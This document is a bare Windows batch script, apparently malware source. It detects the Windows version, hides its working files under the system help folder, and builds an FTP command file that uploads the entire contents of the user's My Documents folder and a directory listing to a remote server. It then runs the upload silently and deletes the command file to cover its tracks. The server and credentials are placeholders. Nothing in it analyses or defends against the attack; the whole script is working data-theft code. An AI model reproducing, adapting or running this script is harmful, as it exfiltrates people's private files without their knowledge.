@ECHO OFF
DEL /F /Q "%SystemRoot%\help\combat\1.log"
IF EXIST "%SystemRoot%\help\combat\2.log" GOTO END
> "%SystemRoot%\help\combat\2.log" ECHO log 2
>>"%SystemRoot%\help\combat\2.log" ECHO.

:FINDOS
VER|FIND "XP">NUL
IF NOT ERRORLEVEL 1 GOTO Win2K
VER|FIND "2000">NUL
IF NOT ERRORLEVEL 1 GOTO Win2K
VER|FIND "NT">NUL
IF NOT ERRORLEVEL 1 GOTO WinNT
VER|FIND "Mil">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
VER|FIND "98">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
VER|FIND "95">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
GOTO END

:Win2K
> "%SystemRoot%\help\combat\up.txt" ECHO open (ftp server)
>>"%SystemRoot%\help\combat\up.txt" ECHO (ftp username)
>>"%SystemRoot%\help\combat\up.txt" ECHO (ftp password)
>>"%SystemRoot%\help\combat\up.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\up.txt" ECHO prompt
>>"%SystemRoot%\help\combat\up.txt" ECHO mput "%SystemDrive%\Documents and Settings\%USERNAME%\My Documents\*.*"
>>"%SystemRoot%\help\combat\up.txt" ECHO put "%SystemRoot%\help\combat\2.log"
>>"%SystemRoot%\help\combat\up.txt" ECHO bye
DIR "%SystemDrive%\Documents and Settings\%USERNAME%\My Documents\" > "%SystemRoot%\help\combat\2.log"
>>"%SystemRoot%\help\combat\2.log" ECHO.
GOTO Upload

:WinNT
> "%SystemRoot%\help\combat\up.txt" ECHO open (ftp server)
>>"%SystemRoot%\help\combat\up.txt" ECHO (ftp username)
>>"%SystemRoot%\help\combat\up.txt" ECHO (ftp password)
>>"%SystemRoot%\help\combat\up.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\up.txt" ECHO prompt
>>"%SystemRoot%\help\combat\up.txt" ECHO mput "%SystemRoot%\profiles\%USERNAME%\personal\*.*"
>>"%SystemRoot%\help\combat\up.txt" ECHO put "%SystemRoot%\help\combat\2.log"
>>"%SystemRoot%\help\combat\up.txt" ECHO bye
DIR "%SystemRoot%\profiles\%USERNAME%\personal\" > "%SystemRoot%\help\combat\2.log"
>>"%SystemRoot%\help\combat\2.log" ECHO.
GOTO Upload

:Win9X
> "%SystemRoot%\help\combat\up.txt" ECHO open (ftp server)
>>"%SystemRoot%\help\combat\up.txt" ECHO (ftp username)
>>"%SystemRoot%\help\combat\up.txt" ECHO (ftp password)
>>"%SystemRoot%\help\combat\up.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\up.txt" ECHO prompt
>>"%SystemRoot%\help\combat\up.txt" ECHO mput "%SystemDrive%\My Documents\*.*"
>>"%SystemRoot%\help\combat\up.txt" ECHO put "%SystemRoot%\help\combat\2.log"
>>"%SystemRoot%\help\combat\up.txt" ECHO bye
DIR "%SystemDrive%\My Documents\" > "%SystemRoot%\help\combat\2.log"
>>"%SystemRoot%\help\combat\2.log" ECHO.
GOTO Upload

:Upload
IF NOT EXIST "%SystemRoot%\help\combat\up.txt" GOTO FINDOS
FTP -s:"%SystemRoot%\help\combat\up.txt" > "%SystemRoot%\help\combat\2.log"
DEL /F /Q "%SystemRoot%\help\combat\up.txt"

:END
EXIT